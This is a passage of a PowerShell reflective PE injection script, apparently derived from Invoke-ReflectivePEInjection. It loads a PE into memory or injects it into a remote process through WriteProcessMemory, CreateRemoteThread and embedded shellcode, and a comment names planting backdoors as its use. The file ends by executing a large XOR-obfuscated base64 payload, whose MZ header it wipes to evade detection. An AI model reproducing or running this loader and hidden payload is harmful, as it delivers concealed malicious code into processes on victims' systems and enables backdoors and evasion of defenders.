		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = 	Get-Win32Functions
		$Win32Types = 		Get-Win32Types
		$Win32Constants =  	Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes  -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
				
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
				Write-Verbose "Calling function with WString return type"
				[IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName $Func
				if ($WStringFuncAddr -eq [IntPtr]::Zero)
				{
					Throw "Couldn't find function address."
				}
				$WStringFuncDelegate = Get-DelegateType @() ([Int32])
				$WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				[IntPtr]$OutputPtr = $WStringFunc.Invoke()
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#if ($PsCmdlet.ParameterSetName -ieq "LocalFile")
	#{
    [Byte[]]$PEBytes = [System.Convert]::FromBase64String($PEBytes)
	
	for ($i = 0; $i -lt $PEBytes.Count; $i++)
	{
		$PEBytes[$i]=$PEBytes[$i] -bXOR 0x17
	}
	#[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
	#}
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

    $PEBytes[0] = 0
    $PEBytes[1] = 0

	Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $Func, $ProcId,$ForceASLR)
}

Main

}
Invoke-ReflectivePEInjection -PEBytes "Wk2HFxQXFxcTFxcX6OgXF68XFxcXFxcXVxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX5xcXFxkIrRkXox7aNq8WW9o2Q39+ZDdnZXhwZXZ6N3R2eXl4Yzd1cjdlYnk3fnk3U1hEN3p4c3I5GhodMxcXFxcXFxdILA8PDE1hXAxNYVwMTWFcnwP5XA9NYVwX0P9cGE1hXBfQy1x+TWFcBTXyXANNYVwMTWBceE1hXBfQylwgTWFcF9D6XA1NYVwX0PxcDU1hXEV+dH8MTWFcFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXR1IXF1sWExeXvUpNFxcXFxcXFxf3FxU2HBYdFxcPFhcXgxcXFxcXF9KSFxcXBxcXFycWFxcXFwcXBxcXFxUXFxIXFhcXFxcXEhcWFxcXFxcX9xYXFxMXFxcXFxcVF1cWFxcHFxcHFxcXFwcXFwcXFxcXFxcHFxcXZ2QWF3cXFxcLfhYXtxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxfXFhdHBhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcnTBYXVxcXFxcXFxcXFxcXFycWF9cWFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc5Y3JvYxcXFwYAFhcXBxcXFw8WFxcTFxcXFxcXFxcXFxcXFxc3Fxd3OWVzdmN2FxfHVBcXFycWFxdTFxcXCxYXFxcXFxcXFxcXFxcXVxcXVzlzdmN2FxcXeyUXFxeXFhcXBRcXF3cWFxcXFxcXFxcXFxcXF1cXF9c5ZXJ7eHQXF90MFxcX1xYXFwsXFxdlFhcXFxcXFxcXFxcXFxdXFxdVFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcX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